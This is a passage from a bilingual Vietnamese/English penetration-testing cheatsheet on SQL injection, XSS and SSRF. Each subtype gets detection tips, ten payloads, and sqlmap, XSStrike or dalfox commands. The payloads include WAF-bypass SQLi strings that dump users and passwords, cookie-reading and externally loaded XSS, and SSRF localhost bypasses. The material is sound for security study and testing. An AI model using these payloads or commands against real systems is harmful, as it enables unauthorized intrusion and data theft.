# CẨM NANG TRA CỨU & KIỂM THỬ LỖ HỔNG BẢO MẬT (SECURITY CHEATSHEET)

Tài liệu cheatsheet tổng hợp chuyên sâu về 15 nhóm lỗ hổng bảo mật ứng dụng web và an ninh nhị phân phổ biến, phục vụ công tác nghiên cứu, kiểm thử bảo mật và rà soát mã nguồn (Code Review). Tất cả thông tin đã được biên soạn và đối chiếu chéo từ các nguồn uy tín: *PortSwigger Web Security Academy, OWASP Cheatsheet Series, PayloadAllTheThings, HackTricks, và các nghiên cứu bảo mật hàng đầu*.

---

## Mục lục (Table of Contents)

- [1. SQL Injection (SQLi)](#1-sql-injection-sqli)
  - [1.1. Error-based SQLi (SQL Injection dựa trên lỗi)](#11-error-based-sqli-sql-injection-dựa-trên-lỗi)
  - [1.2. Union-based SQLi (SQL Injection dựa trên liên kết)](#12-union-based-sqli-sql-injection-dựa-trên-liên-kết)
  - [1.3. Blind Boolean-based SQLi (SQL Injection mù logic đúng/sai)](#13-blind-boolean-based-sqli-sql-injection-mù-logic-đúngsai)
  - [1.4. Blind Time-based SQLi (SQL Injection mù thời gian)](#14-blind-time-based-sqli-sql-injection-mù-thời-gian)
- [2. Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
  - [2.1. Reflected XSS (XSS phản xạ)](#21-reflected-xss-xss-phản-xạ)
  - [2.2. Stored XSS (XSS lưu trữ)](#22-stored-xss-xss-lưu-trữ)
  - [2.3. DOM-based XSS (XSS dựa trên DOM)](#23-dom-based-xss-xss-dựa-trên-dom)
- [3. Server-Side Request Forgery (SSRF)](#3-server-side-request-forgery-ssrf)
  - [3.1. Basic SSRF (SSRF cơ bản - có phản hồi dữ liệu)](#31-basic-ssrf-ssrf-cơ-bản-có-phản-hồi-dữ-liệu)
  - [3.2. Blind SSRF (SSRF mù - không phản hồi dữ liệu)](#32-blind-ssrf-ssrf-mù-không-phản-hồi-dữ-liệu)
  - [3.3. Cloud Metadata SSRF (SSRF khai thác Metadata dịch vụ đám mây)](#33-cloud-metadata-ssrf-ssrf-khai-thác-metadata-dịch-vụ-đám-mây)
- [4. XML External Entity (XXE)](#4-xml-external-entity-xxe)
  - [4.1. Basic XXE (XXE cơ bản - có phản hồi dữ liệu)](#41-basic-xxe-xxe-cơ-bản-có-phản-hồi-dữ-liệu)
  - [4.2. Blind XXE (Out-of-Band XXE - XXE mù)](#42-blind-xxe-out-of-band-xxe-xxe-mù)
  - [4.3. Error-based XXE (XXE dựa trên lỗi)](#43-error-based-xxe-xxe-dựa-trên-lỗi)
- [5. LFI/RFI + Path Traversal](#5-lfirfi-path-traversal)
  - [5.1. Basic Path Traversal / LFI](#51-basic-path-traversal-lfi)
  - [5.2. PHP Wrappers](#52-php-wrappers)
  - [5.3. Log Poisoning](#53-log-poisoning)
  - [5.4. Remote File Inclusion (RFI)](#54-remote-file-inclusion-rfi)
  - [5.5. WAF Bypass (WAF Bypass Payload included)](#55-waf-bypass-waf-bypass-payload-included)
- [6. Command Injection (OS Injection)](#6-command-injection-os-injection)
  - [6.1. Active Command Injection (Direct Output)](#61-active-command-injection-direct-output)
  - [6.2. Blind Time-based Command Injection](#62-blind-time-based-command-injection)
  - [6.3. Blind Out-of-Band (OOB) Command Injection](#63-blind-out-of-band-oob-command-injection)
  - [6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included)](#64-filter-bypass-waf-bypass-waf-bypass-payload-included)
- [7. IDOR / Broken Access Control](#7-idor-broken-access-control)
  - [7.1. Horizontal Privilege Escalation / IDOR](#71-horizontal-privilege-escalation-idor)
  - [7.2. Vertical Privilege Escalation / Broken Access Control](#72-vertical-privilege-escalation-broken-access-control)
- [8. JWT Attacks](#8-jwt-attacks)
  - [8.1. Alg None Attacks](#81-alg-none-attacks)
  - [8.2. Weak Secret Exploitation (HS256)](#82-weak-secret-exploitation-hs256)
  - [8.3. kid Injection](#83-kid-injection)
  - [8.4. JWK / JKU Injection (JWKS Spoofing)](#84-jwk-jku-injection-jwks-spoofing)
- [9. SSTI (Server-Side Template Injection)](#9-ssti-server-side-template-injection)
  - [9.1. Detection & Identification Polyglots](#91-detection-identification-polyglots)
  - [9.2. Jinja2 (Python)](#92-jinja2-python)
  - [9.3. Twig (PHP)](#93-twig-php)
  - [9.4. FreeMarker (Java)](#94-freemarker-java)
  - [9.5. Velocity (Java)](#95-velocity-java)
- [10. Deserialization](#10-deserialization)
  - [10.1. Java (ysoserial & Serialization Signatures)](#101-java-ysoserial-serialization-signatures)
  - [10.2. PHP Object Injection](#102-php-object-injection)
  - [10.3. Python Pickle](#103-python-pickle)
- [11. CSRF (Cross-Site Request Forgery)](#11-csrf-cross-site-request-forgery)
  - [11.1. Basic GET & POST CSRF](#111-basic-get-post-csrf)
  - [11.2. Token Bypass CSRF](#112-token-bypass-csrf)
  - [11.3. Cookie & Origin Bypass CSRF](#113-cookie-origin-bypass-csrf)
- [12. CORS Misconfiguration (Cross-Origin Resource Sharing)](#12-cors-misconfiguration-cross-origin-resource-sharing)
  - [12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials)](#121-basic-cors-exploitation-dynamic-origin-reflect-credentials)
  - [12.2. CORS Trust Bypass (Null Origin & Localhost Trust)](#122-cors-trust-bypass-null-origin-localhost-trust)
  - [12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation)](#123-advanced-cors-bypass-regex-subdomain-xss-exploitation)
- [13. File Upload Bypass](#13-file-upload-bypass)
  - [13.1. File Extension & Name Manipulation Bypass](#131-file-extension-name-manipulation-bypass)
  - [13.2. Content-Type & Signature Validation Bypass](#132-content-type-signature-validation-bypass)
  - [13.3. Web Server Configuration & File Execution Hijacking](#133-web-server-configuration-file-execution-hijacking)
- [14. Open Redirect](#14-open-redirect)
  - [14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass)](#141-scheme-domain-based-open-redirect-absolute-redirect-protocol-relative-bypass)
  - [14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass)](#142-filter-whitelist-bypass-subdomain-spoofing-path-traversal-bypass)
  - [14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF)](#143-parameter-protocol-pollution-parameter-pollution-jsdata-redirection-crlf)
- [15. Buffer Overflow / Binary Exploitation](#15-buffer-overflow-binary-exploitation)
  - [15.1. Stack Buffer Overflow & Shellcode Execution](#151-stack-buffer-overflow-shellcode-execution)
  - [15.2. Return-Oriented Programming & ret2libc](#152-return-oriented-programming-ret2libc)
  - [15.3. Binary Security Mechanism Bypasses & Format Strings](#153-binary-security-mechanism-bypasses-format-strings)

## 1. SQL Injection (SQLi)

SQL Injection (SQLi) là lỗ hổng xảy ra khi dữ liệu đầu vào của người dùng được nối trực tiếp vào câu lệnh SQL mà không qua xử lý hoặc tham số hóa, cho phép kẻ tấn công can thiệp vào logic truy vấn của Cơ sở dữ liệu (DBMS).

### 1.1. Error-based SQLi (SQL Injection dựa trên lỗi)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng hiển thị trực tiếp các thông báo lỗi chi tiết của hệ quản trị cơ sở dữ liệu (DBMS Error Messages) lên giao diện người dùng (User Interface) hoặc trong phản hồi HTTP (HTTP Response). Các thông báo lỗi này thường chứa tên bảng, tên cột hoặc thông tin cú pháp bị lỗi.
    *   *English*: Error-based SQLi is identified when the application displays verbose database engine error messages (DBMS Error Messages) within the user interface or HTTP responses. These errors expose technical details such as table/column names, query structures, or syntax mismatches.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi các ký tự phá vỡ cú pháp như dấu nháy đơn (`'`), dấu nháy kép (`"`), dấu ngoặc đơn (`(`, `)`), gạch chéo ngược (`\`), hoặc các phép toán chia cho 0 (`1/0`) vào các tham số. Nếu phản hồi trả về mã lỗi HTTP `500 Internal Server Error` kèm thông tin lỗi dạng `SQL syntax error`, `Unclosed quotation mark`, hoặc `Conversion failed`, có khả năng cao điểm đầu vào bị lỗi.
    *   *English*: Input syntax-breaking characters such as `'`, `"`, parenthesis, backslashes `\`, or division-by-zero operations into parameters. Analyze the HTTP response for status code `500` or explicit error messages such as `SQL syntax error` or `Conversion failed`.
*   **Payloads (10 Payloads)**:
    ```sql
    -- 1. MySQL Error-based payload abusing `updatexml()` XML parser function.
    ' AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)-- -

    -- 2. MySQL Error-based payload using `extractvalue()`.
    ' AND extractvalue(1, concat(0x7e, (SELECT @@version)))-- -

    -- 3. MySQL Error-based payload via `GTID_SUBSET()` function.
    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -

    -- 4. MSSQL datatype conversion error (converting version string @@version to integer).
    ' AND CAST((SELECT @@version) AS INT)=1-- -

    -- 4b. PostgreSQL datatype conversion error (converting version() string to integer).
    ' AND CAST(version() AS INT)=1-- -

    -- 5. Generic DBMS division-by-zero error payload (⚠️ MySQL Note: MySQL only returns NULL and raises a warning; this triggers database errors on PostgreSQL/MSSQL).
    '; SELECT 1/0-- -

    -- 6. PostgreSQL datatype conversion error to leak table names.
    ' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)-- -

    -- 7. Oracle XMLType parsing error payload to retrieve current user.
    ' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NOT NULL-- -

    -- 8. Oracle database error using the `ctxsys.drithsx.sn` function.
    ' AND (SELECT ctxsys.drithsx.sn(1, (SELECT user FROM dual)) FROM dual) IS NOT NULL-- -

    -- 9. MySQL JSON function error.
    ' OR JSON_KEYS((SELECT CONCAT(0x7e, version(), 0x7e)))-- -

    -- 10. URL encoded, mixed-case, and `#` comment character replacing `--` to bypass naive pattern-matching WAF rules.
    %27%20aNd%20ExtractValue(1,%20conCat(0x7e,%20(seLeCt%20veRsIoN()),%200x7e))%23
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap để quét tự động phát hiện và khai thác lỗ hổng Error-based SQLi bằng cách giới hạn kỹ thuật quét (`--technique=E`).
    *   *English*: Use sqlmap to scan, detect, and exploit Error-based SQLi by specifying the scan technique (`--technique=E`).
    ```bash
    # Detect error-based SQLi on target parameter 'id'
    sqlmap -u "http://target.com/product.php?id=1" --technique=E --batch --banner
    # Extract database names using error-based technique
    sqlmap -u "http://target.com/product.php?id=1" --technique=E --dbs --batch
    ```

---

### 1.2. Union-based SQLi (SQL Injection dựa trên liên kết)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi dữ liệu trả về từ câu truy vấn SQL gốc được hiển thị trực tiếp trên giao diện. Kẻ tấn công sử dụng toán tử `UNION` để kết hợp kết quả truy vấn gốc với một truy vấn tùy ý khác, từ đó trích xuất thông tin nhạy cảm từ các bảng khác.
    *   *English*: Union-based SQLi occurs when the query results are rendered directly on the web page. Attackers inject the `UNION` operator to combine the original query results with an arbitrary query to retrieve records from other database tables.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: 
        1. Xác định số lượng cột của câu truy vấn gốc bằng mệnh đề `ORDER BY`: Thử tăng dần chỉ số (`ORDER BY 1`, `ORDER BY 2`,...) cho đến khi trang web thay đổi hành vi hoặc báo lỗi.
        2. Xác định kiểu dữ liệu của từng cột bằng cách chèn `NULL` hoặc giá trị cụ thể: `' UNION SELECT NULL, NULL, NULL-- -`.
    *   *English*:
        1. Determine column count using `ORDER BY N` (increment N until the page structure changes or throws an error).
        2. Determine column data types by injecting `NULL` values or string constants: `' UNION SELECT 'a', NULL, 3-- -`.
*   **Payloads (10 Payloads)**:
    ```sql
    -- 1. Test if the table has at least 1 column.
    ' ORDER BY 1-- -

    -- 2. Test if the table has at least 10 columns.
    ' ORDER BY 10-- -

    -- 3. 3-column NULL injection (generic compatibility test).
    ' UNION SELECT NULL, NULL, NULL-- -

    -- 4. Test if the first column accepts string values.
    ' UNION SELECT 'a', NULL, NULL-- -

    -- 5. Extract MySQL/MSSQL database version (rendered in the 2nd column).
    ' UNION SELECT NULL, @@version, NULL-- -

    -- 6. Extract PostgreSQL database version.
    ' UNION SELECT NULL, version(), NULL-- -

    -- 7. Extract Oracle database banner.
    ' UNION SELECT NULL, banner, NULL FROM v$version WHERE ROWNUM=1-- -

    -- 8. Extract all tables and databases (MySQL/PostgreSQL/MSSQL).
    ' UNION SELECT table_schema, table_name, NULL FROM information_schema.tables-- -

    -- 9. Extract column names and data types of the `users` table.
    ' UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users'-- -

    -- 10. Uses MySQL-specific comment syntax (`/*!50000... */`) and mixed-case to bypass strict signature-based WAFs.
    /*!50000%55nion*//*!50000%53elect*/+1,username,password+FRoM+users--+-
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap với kỹ thuật Union-based (`--technique=U`) để xác định số lượng cột và trích xuất dữ liệu tốc độ cao.
    *   *English*: Use sqlmap with Union-based technique (`--technique=U`) to automatically determine columns and perform high-speed data extraction.
    ```bash
    # Detect union-based SQLi and verify column count automatically
    sqlmap -u "http://target.com/product.php?id=1" --technique=U --batch --banner
    # Dump tables from specific database using Union technique
    sqlmap -u "http://target.com/product.php?id=1" -D app_db --tables --dump --batch
    ```

---

### 1.3. Blind Boolean-based SQLi (SQL Injection mù logic đúng/sai)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng không trả về dữ liệu truy vấn hay thông tin lỗi cụ thể, nhưng cấu trúc phản hồi hoặc nội dung hiển thị của trang web thay đổi (ví dụ: hiển thị "Chào mừng" vs. "Không tìm thấy tài khoản") dựa trên kết quả logic của câu truy vấn đầu vào là Đúng (True) hoặc Sai (False).
    *   *English*: Boolean-based blind SQLi is present when the application does not display query data or errors, but its response changes dynamically (e.g., displaying different text elements or status codes) depending on whether the injected condition evaluates to True or False.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn các biểu thức logic luôn đúng (`AND 1=1`) và luôn sai (`AND 1=2`). So sánh sự khác biệt trong phản hồi (độ dài Response, sự xuất hiện của các từ khóa cụ thể). Nếu kết quả `AND 1=1` giống trang bình thường còn `AND 1=2` làm mất dữ liệu hoặc thay đổi cấu trúc trang, lỗ hổng tồn tại.
    *   *English*: Inject logical conditions that are always true (`AND 1=1`) and always false (`AND 1=2`). Compare response lengths or text changes. If the "true" input mirrors normal behavior while the "false" input alters the page output, it indicates SQLi.
*   **Payloads (10 Payloads)**:
    ```sql
    -- 1. True logical assertion (normal response expected).
    ' AND 1=1-- -

    -- 2. False logical assertion (modified response expected).
    ' AND 1=2-- -

    -- 3. Verify that subqueries are functional.
    ' AND (SELECT 1)=1-- -

    -- 4. Brute-force character check for database version (MySQL).
    ' AND SUBSTRING((SELECT @@version),1,1)='5'-- -

    -- 5. Compare the ASCII value of the first character of the username.
    ' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))>97-- -

    -- 6. Boolean evaluation using `IIF` (MSSQL).
    ' AND (SELECT IIF(1=1, 1, 0))=1-- -

    -- 7. DBMS-agnostic conditional logic check.
    ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)=1-- -

    -- 8. Check if the database name length is greater than 1.
    ' AND LENGTH((SELECT database()))>1-- -

    -- 9. Check if user `admin` exists in the database.
    ' AND (SELECT EXISTS(SELECT * FROM users WHERE username='admin'))-- -

    -- 10. Uses hex representation (`0x61646d696e` for `admin`), `LIKE` operator instead of `=`, and multi-line comments `/**/` to bypass signature filters on spaces and strings.
    'oR(username/**/Like/**/0x61646d696e)-- -
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap với kỹ thuật Boolean-blind (`--technique=B`) để khai thác và trích xuất dữ liệu qua các câu hỏi logic Đúng/Sai.
    *   *English*: Use sqlmap with Boolean-blind technique (`--technique=B`) to exploit and extract database records through True/False questions.
    ```bash
    # Detect boolean-based blind SQLi using customized threat levels
    sqlmap -u "http://target.com/product.php?id=1" --technique=B --level=3 --risk=2 --batch
    # Extract users password hash using Boolean-blind queries
    sqlmap -u "http://target.com/product.php?id=1" -D app_db -T users -C username,password --dump --batch
    ```

---

### 1.4. Blind Time-based SQLi (SQL Injection mù thời gian)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng không thay đổi giao diện hay cấu trúc phản hồi đối với bất kỳ điều kiện Đúng/Sai nào. Dấu hiệu nhận biết duy nhất là thời gian xử lý và trả về phản hồi (Response Latency) của máy chủ tăng lên rõ rệt khi kẻ tấn công đưa vào các lệnh trì hoãn thời gian thực thi (Time Delay functions).
    *   *English*: Time-based blind SQLi is characterized by responses that do not vary in content, but the database execution latency (response delay) increases when delay functions are triggered under specific logical conditions.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn các câu lệnh gây trễ hệ thống (như `SLEEP()`, `pg_sleep()`, hoặc `WAITFOR DELAY`). Đo thời gian máy chủ phản hồi; nếu thời gian phản hồi tăng lên tương đương với số giây được cấu hình trong payload, điểm đầu vào đó có khả năng cao bị ảnh hưởng.
    *   *English*: Inject database delay queries (such as `SLEEP()`, `pg_sleep()`, or `WAITFOR DELAY`) and measure request round-trip time. If the response delay corresponds to the injected parameter, the application is vulnerable.
*   **Payloads (10 Payloads)**:
    ```sql
    -- 1. Triggers 5 seconds sleep in MySQL.
    ' AND SLEEP(5)-- -

    -- 2. Triggers 5 seconds sleep in MSSQL.
    '; WAITFOR DELAY '0:0:5'-- -

    -- 3. Triggers 5 seconds sleep in PostgreSQL.
    ' AND pg_sleep(5)-- -

    -- 4. Triggers 5 seconds sleep in Oracle.
    ' AND (SELECT dbms_pipe.receive_message('a',5) FROM dual)-- -

    -- 5. Subquery-based sleep function for MySQL.
    ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)-- -

    -- 6. Stacked query PostgreSQL sleep execution.
    '; SELECT pg_sleep(5)-- -

    -- 7. Conditional sleep in MySQL.
    ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -

    -- 8. Conditional sleep in MSSQL.
    '; IF (1=1) WAITFOR DELAY '0:0:5'-- -

    -- 9. Oracle time delay combined with string concatenation.
    '||(SELECT 'a' FROM dual WHERE 1=1 AND dbms_pipe.receive_message('a',5)=1)||'

    -- 10. Uses bitwise ampersands `%26` and nested subqueries to obscure the `sleep` function from WAF filters.
    %27%26(select*from(select(sleep(5)))a)%26%27
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap với kỹ thuật Time-blind (`--technique=T`) để quét các phản hồi trễ của cơ sở dữ liệu.
    *   *English*: Use sqlmap with Time-blind technique (`--technique=T`) to scan and detect database latency delays.
    ```bash
    # Detect time-based blind SQLi and optimize delay settings
    sqlmap -u "http://target.com/product.php?id=1" --technique=T --time-sec=5 --batch
    # Bypass WAF filtering using space2comment and charencode tamper scripts
    sqlmap -u "http://target.com/product.php?id=1" --technique=T --tamper=space2comment,charencode --random-agent --batch
    ```

---


## 2. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) xảy ra khi ứng dụng nhận dữ liệu không đáng tin cậy và hiển thị/thực thi nó trên trình duyệt của người dùng dưới dạng mã kịch bản (JavaScript) mà không được mã hóa hoặc làm sạch.

### 2.1. Reflected XSS (XSS phản xạ)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Phát sinh khi kịch bản độc hại được gửi kèm trong yêu cầu HTTP của nạn nhân, sau đó máy chủ phản chiếu (reflect) trực tiếp kịch bản này vào nội dung trang phản hồi mà không lưu trữ trong cơ sở dữ liệu.
    *   *English*: Reflected XSS occurs when a malicious script is included in the HTTP request sent by a victim. The server immediately reflects this script back into the HTTP response without persisting it in the database.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập một chuỗi ký tự ngẫu nhiên duy nhất (ví dụ: `xsscheck123`) vào các tham số đầu vào (URL Parameters, Search box). Xem mã nguồn trang (Page Source) hoặc DevTools Elements để tìm kiếm vị trí chuỗi đó hiển thị nhằm xác định ngữ cảnh (HTML tag, thuộc tính tag, hoặc khối script).
    *   *English*: Input a unique string (e.g., `xsscheck123`) into input fields or parameters. Inspect the DOM/Page Source to find where the string is reflected and identify the target context (HTML context, attribute context, or JavaScript context).
*   **Payloads (10 Payloads)**:
    ```html
    <!-- 1. Classic simple script execution payload. -->
    <script>alert(1)</script>

    <!-- 2. Breaks out of an HTML attribute to execute a script. -->
    "><script>alert(document.domain)</script>

    <!-- 3. Executes script via the image error event handler (bypass for blocked `<script>` tags). -->
    <img src=x onerror=alert(1)>

    <!-- 4. SVG onload event execution. -->
    <svg onload=alert(1)>

    <!-- 5. Injected into `href` or `src` attributes of anchors/frames. -->
    javascript:alert(1)

    <!-- 6. Breaks out of a JavaScript string variable definition. -->
    '-alert(1)-'

    <!-- 7. Closes an existing script tag and initiates a new one. -->
    </script><script>alert(1)</script>

    <!-- 8. Sub-document sandboxed execution payload. -->
    <iframe src="javascript:alert(1)"></iframe>

    <!-- 9. Body load event handler payload. -->
    <body onload=alert(1)>

    <!-- 10. Uses Base64 encoded payload (`YWxlcnQoMSk=` represents `alert(1)`) decoded at runtime via `eval(atob())`, with a slash separator `svg/onload` to bypass space and keyword signature-based WAFs. -->
    <svg/onload=eval(atob('YWxlcnQoMSk='))>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng XSStrike để phân tích ngữ cảnh tham số hoặc dalfox để dò quét hàng loạt lỗi Reflected XSS.
    *   *English*: Use XSStrike to analyze reflected parameter contexts or dalfox for fast bulk reflected XSS scanning.
    ```bash
    # Scan Reflected XSS using XSStrike parameter detection
    python xsstrike.py -u "http://target.com/search.php?q=test"
    # Scan Reflected XSS with fast multi-threading tool dalfox
    dalfox url "http://target.com/search?q=test"
    ```

---

### 2.2. Stored XSS (XSS lưu trữ)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xảy ra khi mã độc được lưu trữ vĩnh viễn (persistent) trong cơ sở dữ liệu hoặc tệp tin trên máy chủ (ví dụ: bình luận, bài viết diễn đàn, thông tin tài khoản). Bất cứ người dùng nào truy cập vào trang hiển thị dữ liệu này sau đó đều bị kích hoạt mã độc trên trình duyệt.
    *   *English*: Stored XSS occurs when a malicious script is permanently stored on the target server (e.g., in a database, forum post, or profile field). The victim's browser executes the script when retrieving the stored data from the server.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Tìm các chức năng cho phép lưu trữ thông tin lâu dài và hiển thị cho người dùng khác (khung bình luận, biểu mẫu gửi liên hệ, cập nhật tên hiển thị). Gửi thử nghiệm các thẻ định dạng HTML và tải lại trang hoặc đăng nhập tài khoản khác để xem thẻ đó có hiển thị thô hay không.
    *   *English*: Target input vectors that persist data (comment sections, profile settings, ticket support forms). Submit HTML elements and verify if they load unescaped across sessions.
*   **Payloads (10 Payloads)**:
    ```html
    <!-- 1. Basic stored testing payload. -->
    <script>alert('StoredXSS')</script>

    <!-- 2. Attempts session hijacking by exposing session cookies (if HTTPOnly is missing). -->
    <img src="empty.jpg" onerror="alert(document.cookie)">

    <!-- 3. Executed via HTML5 video loading failure. -->
    <video><source onerror="alert(1)"></video>

    <!-- 4. Modern tag event handler executing on toggle event. -->
    <details open ontoggle=alert(1)>

    <!-- 5. URI-based execution hidden within a hyperlink. -->
    <a href="javascript:alert(1)">Click to Win</a>

    <!-- 6. Double escaped payload utilizing the `srcdoc` attribute of an iframe. -->
    <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

    <!-- 7. Execution via marquee start event. -->
    <marquee onstart=alert(1)>Scroll</marquee>

    <!-- 8. MathML tag link event execution (standard browser support). -->
    <math href="javascript:alert(1)">CLICK</math>

    <!-- 9. Self-triggering focus state payload. -->
    <select autofocus onfocus=alert(1)>

    <!-- 10. Uses Base64-encoded data URI in an `<object>` tag to completely hide the JavaScript syntax from signature scanners. -->
    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng XSStrike hoặc dalfox với session header để quét Stored XSS, hoặc gửi payload đến OOB Server.
    *   *English*: Use XSStrike or dalfox with session headers to scan for stored vectors, or route blind payloads to OOB servers.
    ```bash
    # Scan Stored XSS on form endpoints by providing authenticated session headers
    python xsstrike.py -u "http://target.com/feedback" --data "name=user&msg=test" --headers "Cookie: PHPSESSID=abc123xyz"
    # Scan for Blind XSS (often Stored) routing payloads to your Out-of-Band callback server
    dalfox url "http://target.com/register?name=test" -b "https://your-xss-hunter.xss.ht"
    ```

---

### 2.3. DOM-based XSS (XSS dựa trên DOM)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xảy ra hoàn toàn ở phía máy khách (Client-side). Lỗ hổng phát sinh khi các mã JavaScript của trang web đọc dữ liệu từ một nguồn không an sau (Source) và ghi trực tiếp vào một điểm nhận nhạy cảm có khả năng thực thi mã (Sink) mà không qua kiểm duyệt.
    *   *English*: DOM-based XSS is a client-side vulnerability. It occurs when JavaScript scripts on the page read from user-controlled inputs (Sources) and pass them to execution functions (Sinks) in the Document Object Model without sanitization.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Xem xét mã nguồn JavaScript trên trình duyệt (Developer Tools -> Sources) để tìm các nguồn dữ liệu có thể kiểm soát bởi người dùng (như `location.hash`, `location.search`, `document.referrer`) được truyền trực tiếp vào các hàm nguy hiểm (như `element.innerHTML`, `document.write`, `eval()`, `setTimeout()`).
    *   *English*: Analyze client-side JS scripts. Identify input sources (e.g., `location.hash`) feeding directly into dangerous sinks (e.g., `element.innerHTML`, `eval()`). Manipulate the URL hash or query parameters and trace execution flow.
*   **Payloads (10 Payloads)**:
    ```html
    <!-- 1. Hash parameter injected into a sink like `innerHTML`. -->
    #<img src=1 onerror=alert(1)>

    <!-- 2. Query parameter injected into a sink like `document.write`. -->
    ?name=<svg onload=alert(1)>

    <!-- 3. For navigation sinks: `location.href = source`. -->
    javascript:alert(1)

    <!-- 4. Escaping a JavaScript string/JSON variable context in the client script. -->
    ';alert(1);'

    <!-- 5. Escaped single quote bypass for client-side sanitizers. -->
    \';alert(1)//

    <!-- 6. Injected into attribute configuration sinks. -->
    "onmouseover="alert(1)

    <!-- 7. Dynamic Base64 payload for redirection sinks. -->
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

    <!-- 8. Breaks out of inline JavaScript code block/function contexts. -->
    }alert(1);{//

    <!-- 8b. AngularJS client-side template injection (sandbox breakout). -->
    {{constructor.constructor('alert(1)')()}}

    <!-- 9. Obfuscated JS execution inside redirection/eval sinks. -->
    javascript:eval(atob('YWxlcnQoMSk='))

    <!-- 10. Encoded payload using ES6 dynamic `import()` to load an external script, bypassing strict inline text scanning of target keywords. -->
    %23%3cimg%20src%3dx%20onerror%3d%22import('%68%74%74%70%73%3a%2f%2f%78%73%73%2e%72%65%70%6f%72%74')%22%3e
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng dalfox với tùy chọn `--deep-dom` để phân tích các source/sink client-side và phát hiện DOM XSS.
    *   *English*: Use dalfox with `--deep-dom` option to automatically analyze client-side sources/sinks and identify DOM XSS.
    ```bash
    # Scan DOM-based XSS by processing JavaScript sources and sinks automatically
    dalfox url "http://target.com/index.html?hash=test" --headless
    # Fuzz DOM inputs using custom wordlists containing browser-breakout payloads
    dalfox pipe < urls.txt --custom-payload /path/to/dom_payloads.txt
    ```

---


## 3. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) xảy ra khi máy chủ bị lừa gửi yêu cầu HTTP/HTTPS đến một địa chỉ IP hoặc miền tùy ý (thường là các máy chủ cục bộ hoặc dịch vụ nội bộ đằng sau tường lửa).

### 3.1. Basic SSRF (SSRF cơ bản - có phản hồi dữ liệu)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xảy ra khi ứng dụng gửi yêu cầu HTTP phía máy chủ (Server-side HTTP request) dựa trên URL do người dùng cung cấp và trả lại toàn bộ hoặc một phần dữ liệu phản hồi đó cho người dùng (ví dụ: chức năng tải ảnh từ link, chuyển đổi định dạng tài liệu).
    *   *English*: Basic SSRF occurs when the server fetches a user-provided URL and displays the response content, headers, or structure back to the user.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập địa chỉ cục bộ (`http://127.0.0.1` hoặc `http://localhost`) hoặc các cổng nội hạt (`http://127.0.0.1:22`, `http://127.0.0.1:6379`). Nếu nhận lời chào SSH Banner, lỗi Redis, hoặc giao diện quản trị nội bộ hiển thị trên màn hình, lỗ hổng tồn tại.
    *   *English*: Inject local loopback addresses (`http://127.0.0.1`, `http://localhost`) or internal ports (`http://127.0.0.1:22`, `http://127.0.0.1:6379`) to check for internal services and raw responses.
*   **Payloads (10 Payloads)**:
    ```txt
    # 1. Basic local loopback test.
    http://127.0.0.1:80

    # 2. SSH port query on local interface.
    http://localhost:22

    # 3. IPv6 loopback bypass.
    http://[::1]:80

    # 4. DNS wildcard resolution (resolves to 127.0.0.1).
    http://127.0.0.1.nip.io

    # 5. Decimal representation of IP 127.0.0.1.
    http://2130706433

    # 6. Hexadecimal representation of IP 127.0.0.1.
    http://0x7f000001

    # 7. Octal representation of IP 127.0.0.1.
    http://0177.0000.0000.0001

    # 8. Shortened IP representation.
    http://127.1

    # 9. A domain controlled by the attacker that resolves to 127.0.0.1.
    http://spoofed-dns.attacker.com

